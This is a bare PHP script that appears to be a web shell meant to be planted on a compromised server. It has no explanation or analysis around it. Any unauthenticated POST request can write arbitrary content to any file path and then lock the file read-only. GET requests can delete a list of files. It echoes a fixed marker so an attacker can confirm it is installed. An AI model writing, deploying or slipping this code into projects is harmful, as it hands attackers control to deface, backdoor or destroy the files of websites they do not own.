<?php if (\$_POST) { \$file = \$_POST[\"f\"]; if (file_exists(\$file)) {chmod(\$file, 0666); unlink(\$file); } \$f = fopen(\$file, \"w\"); if (\$f) { if (fwrite(\$f, \$_POST[\"c\"])) { echo \"OK!\"; chmod(\$file, 0444); } else { echo \"Error!\"; } fclose(\$f); } else { echo \"U to w.\"; } } elseif (\$_GET && isset(\$_GET[\"c\"])) { \$fps = \$_GET[\"c\"]; if (!empty(\$fps)) { \$fps = explode(\",\", \$fps); foreach (\$fps as \$fp) { if (file_exists(\$fp)) { unlink(\$fp); echo \"File \'\$fp\' del.<br>\"; } else { echo \"File \'\$fp\' not exist.<br>\"; } } }}echo \'SXSXSXSX\'; ?>
